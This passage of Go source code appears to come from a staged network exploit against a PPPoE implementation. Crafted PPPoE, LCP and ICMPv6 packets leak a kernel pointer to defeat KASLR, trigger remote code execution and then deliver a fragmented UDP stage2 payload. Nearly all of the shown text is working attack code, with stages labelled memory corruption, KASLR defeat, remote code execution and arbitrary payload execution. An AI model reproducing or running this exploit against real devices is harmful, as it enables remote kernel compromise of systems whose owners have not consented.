	for packet := range e.p.Source.Packets() {
		if icmpv6NsLayer := packet.Layer(layers.LayerTypeICMPv6NeighborSolicitation); icmpv6NsLayer != nil {
			icmpv6Ns := icmpv6NsLayer.(*layers.ICMPv6NeighborSolicitation)
			for _, opt := range icmpv6Ns.Options {
				if opt.Type == layers.ICMPv6OptSourceAddress && len(opt.Data) > 1 {
					data = opt.Data
					end = true
					break
				}
			}
		}
		if end {
			break
		}
	}
	e.pppoe_softc_list = binary.LittleEndian.Uint64(data[1:9])
	fmt.Printf("[+] pppoe_softc_list: %x\n", e.pppoe_softc_list)
	e.kaslr_offset = e.pppoe_softc_list - e.offs.PPPOE_SOFTC_LIST
	fmt.Printf("[+] kaslr_offset: %x\n", e.kaslr_offset)

	if e.pppoe_softc_list&0xffffffff00000fff != e.offs.PPPOE_SOFTC_LIST&0xffffffff00000fff {
		fmt.Println("[-] Error leak is invalid. Wrong firmware?")
		os.Exit(1)
	}
}

func (e *Exploit) runStage3() {
	fmt.Println("[*] Sending LCP terminate request...")
	err := e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp2.Pkt{
			Proto: lcp2.ProtoLCP,
			Code:  lcp2.CodeTerminateRequest,
		},
	})
	if err != nil {
		log.Fatal(err)
	}

	e.ppp_negotation(e.BuildFakeLle, false)

	fmt.Println("[*] Triggering code execution...")
	err = e.p.SendICMPv6(&packet.SendICMPv6Params{
		SrcMAC:       e.source_mac,
		DstMAC:       e.target_mac,
		EthernetType: layers.EthernetTypeIPv6,
		SrcIP:        net.ParseIP(SOURCE_IPV6),
		DstIP:        e.target_ipv6,
		HopLimit:     64,
		ICMPv6Type:   layers.ICMPv6TypeEchoRequest,
		Layers: []gopacket.SerializableLayer{
			&layers.ICMPv6Echo{},
		},
	})
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[*] Waiting for stage1 to resume...")
	count := 0
	for count < 3 {
		e.p.ReceiveLCP(lcp2.ProtoLCP, lcp2.CodeConfigureRequest)
		count++
	}

	fmt.Println("[*] Sending PADT...")
	err = e.p.Send(&packet.SendParams{
		FixLengths: true,
		Layers: []gopacket.SerializableLayer{
			&layers.Ethernet{
				SrcMAC:       e.source_mac,
				DstMAC:       e.target_mac,
				EthernetType: layers.EthernetTypePPPoEDiscovery,
			},
			&pppoe2.Pkt{
				Code:      layers.PPPoECodePADT,
				SessionID: SESSION_ID,
			},
		},
	})
	if err != nil {
		log.Fatal(err)
	}

	e.ppp_negotation(nil, false)
	e.lcp_negotiation()
	e.ipcp_negotiation()
}

func (e *Exploit) RunStage4() {
	e.runStage4()
}

func (e *Exploit) runStage4() {
	fmt.Println("[*] Sending stage2 payload...")
	ipv4 := &layers.IPv4{
		Version:  4,
		Id:       1,
		SrcIP:    net.ParseIP(SOURCE_IPV4),
		DstIP:    net.ParseIP(TARGET_IPV4),
		Protocol: layers.IPProtocolUDP,
		TTL:      64,
	}
	udp := &layers.UDP{
		SrcPort: 53,
		DstPort: STAGE2_PORT,
	}
	err := udp.SetNetworkLayerForChecksum(ipv4)
	if err != nil {
		log.Fatal(err)
	}
	data, err := e.p.ToBytes(&packet.SendParams{
		FixLengths:       true,
		ComputeChecksums: true,
		Layers: []gopacket.SerializableLayer{
			ipv4,
			udp,
			gopacket.Payload(e.stage2),
		},
	})
	if err != nil {
		log.Fatal(err)
	}

	frags := utils.SplitBytes(data, 1024)
	for _, frag := range frags {
		err = e.p.Send(&packet.SendParams{
			FixLengths: true,
			Layers: []gopacket.SerializableLayer{
				&layers.Ethernet{
					SrcMAC:       e.source_mac,
					DstMAC:       e.target_mac,
					EthernetType: layers.EthernetTypeIPv4,
				},
				gopacket.Payload(frag),
			},
		})
		if err != nil {
			log.Fatal(err)
		}
	}
}

func (e *Exploit) Run() {
	fmt.Println()
	fmt.Println("[+] STAGE 0: Initialization")
	e.runStage0()

	fmt.Println()
	fmt.Println("[+] STAGE 1: Memory corruption")
	e.runStage1()

	fmt.Println()
	fmt.Println("[+] STAGE 2: KASLR defeat")
	e.runStage2()

	fmt.Println()
	fmt.Println("[+] STAGE 3: Remote code execution")
	e.runStage3()

	fmt.Println()
	fmt.Println("[+] STAGE 4: Arbitrary payload execution")
	e.runStage4()
}
